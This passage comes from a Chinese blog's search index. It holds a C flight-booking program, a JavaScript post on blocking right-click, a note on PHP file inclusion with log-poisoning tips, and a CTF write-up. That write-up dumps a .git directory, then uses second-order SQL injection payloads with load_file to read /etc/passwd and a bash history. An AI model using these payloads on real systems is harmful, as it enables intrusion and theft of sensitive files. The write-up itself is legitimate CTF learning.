class="line">    i=left;</span><br><span class="line">    j=right;</span><br><span class="line">    <span class="keyword">while</span>(i!=j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//顺序很重要，要先从右边开始找</span></span><br><span class="line">        <span class="keyword">while</span>(data[j].ID&gt;=temp.ID &amp;&amp; i&lt;j)</span><br><span class="line">            j--;</span><br><span class="line">        <span class="comment">//再找右边的</span></span><br><span class="line">        <span class="keyword">while</span>(data[i].ID&lt;=temp.ID &amp;&amp; i&lt;j)</span><br><span class="line">            i++;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;j)</span><br><span class="line">        &#123;</span><br><span class="line">            t=data[i];</span><br><span class="line">            data[i]=data[j];</span><br><span class="line">            data[j]=t;</span><br><span class="line">            writeData();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    data[left]=data[i];</span><br><span class="line">    data[i]=temp;</span><br><span class="line">    writeData();</span><br><span class="line">    quicksort(left,i<span class="number">-1</span>);</span><br><span class="line">    quicksort(i+<span class="number">1</span>,right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">order</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    c=count;</span><br><span class="line">    quicksort(<span class="number">0</span>,c<span class="number">-1</span>);</span><br><span class="line">    List();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fix</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p_id,t=<span class="number">-1</span>,i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t   -------------------------------------------------------------------------------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t\t   ---‖   您正在修改航班   ‖---\n\n"</span>); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入需操作的航班ID:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;p_id);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;count;i++)&#123;<span class="comment">//判定操作是否有效</span></span><br><span class="line">        <span class="keyword">if</span>(data[i].ID==p_id)&#123;</span><br><span class="line">            t=i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">if</span>(t==<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   对不起,无此次航班。重新操作请按1,按任意键返回上一层\n"</span>);</span><br><span class="line">            <span class="keyword">int</span> s;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;s);</span><br><span class="line">            <span class="keyword">if</span>(s==<span class="number">1</span>) fix();</span><br><span class="line">            <span class="keyword">else</span> admire();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入起降时间:"</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;data[t].time);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入日期:"</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;data[t].data);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入起点:"</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;data[t].start);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入终点:"</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;data[t].<span class="built_in">end</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入票价:"</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;data[t].P_num);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   请输入余票:"</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;data[t].price);</span><br><span class="line">            writeData();<span class="comment">//写入文件 </span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   修改成功!\n"</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   按任意键返回上一层!\n\n"</span>);</span><br><span class="line">            getch();</span><br><span class="line">            admire();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">passager</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t   -------------------------------------------------------------------------------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\t\t\t\t\t   ---‖   您正在查看乘客信息   ‖---\n\n"</span>); </span><br><span class="line">    <span class="keyword">if</span>(use==<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   没有乘客可查看\n"</span>);</span><br><span class="line">        admire();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t     乘客订单      姓名      身份证号      票数      航班号\n"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;use;i++)&#123;<span class="comment">// 依次输出乘客信息 </span></span><br><span class="line">        <span class="keyword">if</span>(user[i].ticket!=<span class="number">0</span>)&#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%42d %11s %11s %11d %10d\n"</span>,user[i].bill,user[i].name,user[i].card,user[i].ticket,user[i].airID);</span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\n\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\t\t\t\t   按任意键返回上一层!\n\n"</span>);</span><br><span class="line">        getch();</span><br><span class="line">        admire();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 程序 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JS禁止和允许网页右键等操作]]></title>
      <url>/%E9%AA%9A%E6%93%8D%E4%BD%9C/ckwd5ws870031d0ucgj5ck3od/</url>
      <content type="html"><![CDATA[<h2 id="CONSOLE使用"><a href="#CONSOLE使用" class="headerlink" title="CONSOLE使用"></a>CONSOLE使用</h2><h3 id="js禁用右键"><a href="#js禁用右键" class="headerlink" title="js禁用右键"></a>js禁用右键</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.oncontextmenu=<span class="function"><span class="keyword">function</span>(<span class="params">evt</span>)</span>&#123;</span><br><span class="line">  evt.preventDefault();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.onselectstart=<span class="function"><span class="keyword">function</span>(<span class="params">evt</span>)</span>&#123;</span><br><span class="line"> evt.preventDefault();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="js允许右键"><a href="#js允许右键" class="headerlink" title="js允许右键"></a>js允许右键</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.oncontextmenu=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.onselectstart=<span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="HTML使用"><a href="#HTML使用" class="headerlink" title="HTML使用"></a>HTML使用</h2><h3 id="单独右键和复制失效"><a href="#单独右键和复制失效" class="headerlink" title="单独右键和复制失效"></a>单独右键和复制失效</h3><hr>
<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- &lt;script language="Javascript"&gt; --&gt;</span></span><br><span class="line">document.oncontextmenu=new Function("event.returnValue=false");  </span><br><span class="line">document.onselectstart=new Function("event.returnValue=false");  </span><br><span class="line"><span class="comment">&lt;!-- &lt;/script&gt; --&gt;</span></span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">#### 方法二</span><br><span class="line"></span><br><span class="line">```html</span><br><span class="line"><span class="comment">&lt;!--在&lt;body&gt;中加入以下代码：--&gt;</span></span><br><span class="line">oncontextmenu="return false" onselectstart="return false"</span><br><span class="line"><span class="comment">&lt;!--或--&gt;</span></span><br><span class="line">oncontextmenu="event.returnValue=false" onselectstart="event.returnValue=false"</span><br></pre></td></tr></table></figure>
<hr>
<h4 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--如果只限制复制，可以在&lt;body&gt;加入以下代码：--&gt;</span></span><br><span class="line">oncopy="alert('对不起，禁止复制！');return false;"</span><br><span class="line"><span class="comment">&lt;!--使菜单文件另存为失效</span></span><br><span class="line"><span class="comment">如果只是禁止了右键和选择复制，别人还可以通过浏览器菜单中的"文件"－"另存为"拷贝文件。为了使拷</span></span><br><span class="line"><span class="comment">贝失效，可以在&lt;body&gt;与&lt;/body&gt;之间加入以下代码：--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"*.htm"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--这样，用户在另存网页时，就会出现"无法保存Web页"的错误。--&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 骚操作 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[文件包含漏洞小结]]></title>
      <url>/web%E5%AD%A6%E4%B9%A0/ckwd5wsa7005xd0ucddm2mdii/</url>
      <content type="html"><![CDATA[<h3 id="简述-amp-amp-原理"><a href="#简述-amp-amp-原理" class="headerlink" title="简述&amp;&amp;原理"></a>简述&amp;&amp;原理</h3><p>如果允许客户端用户输入控制动态包含在服务器端的文件,会导致恶意代码的执行及敏感信息泄露,主要包括本地文件包含和远程文件包含两种形式.</p>
<p>常见的包含函数有：$_include()、$_require()</p>
<p>区别：</p>
<ol>
<li>include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行</li>
<li>require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行</li>
</ol>
<p>require一般是用于文件头包含类文件、数据库等等文件,常见的比如php文件,include一般是用于包含html模版文件.<br>include_once()、require_once()与(include\require)的功能相同,只是区别于当重复调用的时候,它只会调用一次.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'f'</span>]);    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><ol>
<li>包含目录文件</li>
</ol>
<p>通过 ./ 当前目录  ../ 上一级目录  来遍历目录读取文件</p>
<ol start="2">
<li>包含日志文件</li>
</ol>
<p>无法上传文件时,可以尝试burpsuite抓包利用user-agent插入payload到日志文件,然后包含容器的日志文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinf();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>注:凌晨包含最好,payload后加exit()退出程序,以防大日志导致浏览器卡死,包含不成功可能是open_basedir限制了目录</p>
<p>常见路径:<br>/var/log/apache/access_log<br>/var/www/logs/access_log<br>/var/log/access_log</p>
<ol start="3">
<li>包含系统环境</li>
</ol>
]]></content>
      
        <categories>
            
            <category> web学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[8307和8302靶场web题wp]]></title>
      <url>/ctf-writeup-web/ckwd5ws6z0015d0uc929gjc6j/</url>
      <content type="html"><![CDATA[<h1 id="http-47-102-141-139-8307"><a href="#http-47-102-141-139-8307" class="headerlink" title="http://47.102.141.139:8307"></a><a href="http://47.102.141.139:8307" target="_blank" rel="noopener">http://47.102.141.139:8307</a></h1><p>首先dirbuster扫一波,发现有login.php和.git目录<br>先去login.php,告诉名字是zhangwei,密码可以用brupsuite的intruder模块爆破<br>先随便输个密码sign in抓包<br><figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>将包丢到intruder模块里,在position设置参数<br><figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>再到payload设置爆破方式,load一个包含数字字母大小写和字符的字典,然后start attack<br><figure class="image-box">
                <img src="./3.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>跑得比较慢,字典比较大,因为也没有hint提示这三位是什么,只能都跑一遍了,最后跑出来是zhangwei666<br>登进去后可以正常发帖,有 title category content ,详情里还有个content<br>打开控制台有惊喜  程序员GIT写一半跑路了,都没来得及Commit :)<br>用githack跑出来半个write_do.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>用gittool工具里的Dumper和Extractor获得完整源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">root@Damyayayayaya:/home/GitTools-master/Dumper<span class="comment"># bash gitdumper.sh http://47.102.141.139:8307/.git/ write</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"><span class="comment"># GitDumper is part of https://github.com/internetwache/GitTools</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Developed and maintained by @gehaxelt from @internetwache</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Use at your own risk. Usage might be illegal in certain circumstances. </span></span><br><span class="line"><span class="comment"># Only for educational purposes!</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Downloaded: HEAD</span><br><span class="line">[-] Downloaded: objects/info/packs</span><br><span class="line">[+] Downloaded: description</span><br><span class="line">[+] Downloaded: config</span><br><span class="line">[+] Downloaded: COMMIT_EDITMSG</span><br><span class="line">[+] Downloaded: index</span><br><span class="line">[-] Downloaded: packed-refs</span><br><span class="line">[+] Downloaded: refs/heads/master</span><br><span class="line">[-] Downloaded: refs/remotes/origin/HEAD</span><br><span class="line">[+] Downloaded: refs/stash</span><br><span class="line">[+] Downloaded: logs/HEAD</span><br><span class="line">[+] Downloaded: logs/refs/heads/master</span><br><span class="line">[-] Downloaded: logs/refs/remotes/origin/HEAD</span><br><span class="line">[-] Downloaded: info/refs</span><br><span class="line">[+] Downloaded: info/exclude</span><br><span class="line">[+] Downloaded: objects/bf/bdf218902476c5c6164beedd8d2fcf593ea23b</span><br><span class="line">[+] Downloaded: objects/e5/b2a2443c2b6d395d06960123142bc91123148c</span><br><span class="line">[-] Downloaded: objects/00/00000000000000000000000000000000000000</span><br><span class="line">[+] Downloaded: objects/2a/d429743f51d38f0d2cf9540ba22720cc6b2f2b</span><br><span class="line">[+] Downloaded: objects/76/9905f5a6f425ce62ed9a1cbf375a61fb56b406</span><br><span class="line">[+] Downloaded: objects/55/56e3ad3f21a0cf5938e26985a04ce3aa73faaf</span><br><span class="line">[+] Downloaded: objects/56/dfc20e665f434b97f34ff4dc85782ae93cf1a4</span><br><span class="line">[+] Downloaded: objects/8e/f569f235780f24c42b60f50d528a03f7238c80</span><br><span class="line"></span><br><span class="line">root@Damyayayayaya:/home/GitTools-master/Extractor<span class="comment"># ./extractor.sh ../Dumper/write/ ../Dumper/write/</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"><span class="comment"># Extractor is part of https://github.com/internetwache/GitTools</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Developed and maintained by @gehaxelt from @internetwache</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Use at your own risk. Usage might be illegal in certain circumstances. </span></span><br><span class="line"><span class="comment"># Only for educational purposes!</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line">[+] Found commit: bfbdf218902476c5c6164beedd8d2fcf593ea23b</span><br><span class="line">[+] Found file: /home/GitTools-master/Extractor/../Dumper/write//0-bfbdf218902476c5c6164beedd8d2fcf593ea23b/write_do.php</span><br><span class="line">[+] Found commit: e5b2a2443c2b6d395d06960123142bc91123148c</span><br><span class="line">[+] Found file: /home/GitTools-master/Extractor/../Dumper/write//1-e5b2a2443c2b6d395d06960123142bc91123148c/write_do.php</span><br><span class="line">[+] Found commit: 5556e3ad3f21a0cf5938e26985a04ce3aa73faaf</span><br><span class="line">[+] Found file: /home/GitTools-master/Extractor/../Dumper/write//2-5556e3ad3f21a0cf5938e26985a04ce3aa73faaf/write_do.php</span><br><span class="line"></span><br><span class="line">root@Damyayayayaya:/home/GitTools-master/Dumper/write/1-e5b2a2443c2b6d395d06960123142bc91123148c<span class="comment"># cat write_do.php</span></span><br></pre></td></tr></table></figure></p>
<p>以下是源码,开始审计<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">'bo_id'</span>]);</span><br><span class="line">    $sql = <span class="string">"select category from board where id='$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">'category'</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=$bo_id"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这道题要post三个变量,在发帖页面是title category content,详情页面是content,也就是说要两个content形成闭合并注释掉后面的数据,用闭合的语句来执行数据库的查询(即二次注入),要注意发帖页面的category其实是content,查询语句要在这里写<br>语句构造很容易理解,例如<br>‘, content=(select load_file(‘//etc/passwd’)),/*<br>然后留言的时候只需要闭合这个就可以执行content的语句<br>‘, content=(select load_file(‘//etc/passwd’)),/**/#<br>就可以查询到当前的系统中所有的用户和用户的主要信息<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash </span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin </span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin </span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin </span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync </span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin </span><br><span class="line">man:x:6:12:man:/var/<span class="keyword">cache</span>/man:/usr/sbin/nologin </span><br><span class="line">lp:x:<span class="number">7</span>:<span class="number">7</span>:lp:/<span class="keyword">var</span>/spool/lpd:/usr/sbin/nologin </span><br><span class="line">mail:x:<span class="number">8</span>:<span class="number">8</span>:mail:/<span class="keyword">var</span>/mail:/usr/sbin/nologin </span><br><span class="line">news:x:<span class="number">9</span>:<span class="number">9</span>:news:/<span class="keyword">var</span>/spool/news:/usr/sbin/nologin </span><br><span class="line">uucp:x:<span class="number">10</span>:<span class="number">10</span>:uucp:/<span class="keyword">var</span>/spool/uucp:/usr/sbin/nologin </span><br><span class="line">proxy:x:<span class="number">13</span>:<span class="number">13</span>:proxy:/<span class="keyword">bin</span>:/usr/sbin/nologin </span><br><span class="line">www-<span class="keyword">data</span>:x:<span class="number">33</span>:<span class="number">33</span>:www-<span class="keyword">data</span>:/<span class="keyword">var</span>/www:/usr/sbin/nologin </span><br><span class="line"><span class="keyword">backup</span>:x:<span class="number">34</span>:<span class="number">34</span>:<span class="keyword">backup</span>:/<span class="keyword">var</span>/backups:/usr/sbin/nologin </span><br><span class="line"><span class="keyword">list</span>:x:<span class="number">38</span>:<span class="number">38</span>:Mailing <span class="keyword">List</span> Manager:/<span class="keyword">var</span>/<span class="keyword">list</span>:/usr/sbin/nologin </span><br><span class="line">irc:x:<span class="number">39</span>:<span class="number">39</span>:ircd:/<span class="keyword">var</span>/run/ircd:/usr/sbin/nologin </span><br><span class="line">gnats:x:<span class="number">41</span>:<span class="number">41</span>:Gnats Bug-Reporting </span><br><span class="line"><span class="keyword">System</span> (<span class="keyword">admin</span>):/<span class="keyword">var</span>/lib/gnats:/usr/sbin/nologin </span><br><span class="line">nobody:x:<span class="number">65534</span>:<span class="number">65534</span>:nobody:/nonexistent:/usr/sbin/nologin </span><br><span class="line">libuuid:x:<span class="number">100</span>:<span class="number">101</span>::/<span class="keyword">var</span>/lib/libuuid: </span><br><span class="line">syslog:x:<span class="number">101</span>:<span class="number">104</span>::/home/syslog:/<span class="keyword">bin</span>/<span class="literal">false</span> </span><br><span class="line">mysql:x:<span class="number">102</span>:<span class="number">105</span>:MySQL </span><br><span class="line"><span class="keyword">Server</span>,,,:/<span class="keyword">var</span>/lib/mysql:/<span class="keyword">bin</span>/<span class="literal">false</span> </span><br><span class="line">www:x:<span class="number">500</span>:<span class="number">500</span>:www:/home/www:/<span class="keyword">bin</span>/bash</span><br></pre></td></tr></table></figure></p>
<p>那么多伪用户都nologin,只有最后一个www用户看起来是正常的,查他的命令历史记录<br>‘, content=(select load_file(‘//home/www/.bash_history’)),/**/# </p>
